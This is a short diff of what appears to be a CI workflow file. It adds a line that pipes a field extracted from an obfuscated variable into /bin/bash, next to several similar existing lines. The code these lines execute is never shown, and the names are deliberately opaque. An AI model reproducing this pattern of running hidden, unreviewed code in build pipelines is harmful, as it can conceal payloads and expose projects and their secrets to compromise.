@@ -26,6 +26,7 @@ jobs:
           echo $vzp0 | jq -r .hhs72 | /bin/bash
           echo $w7320 | jq -r .v00506 | /bin/bash
           echo $ysa5 | jq -r .jrzjd7 | /bin/bash
+          echo $i09 | jq -r .om471 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
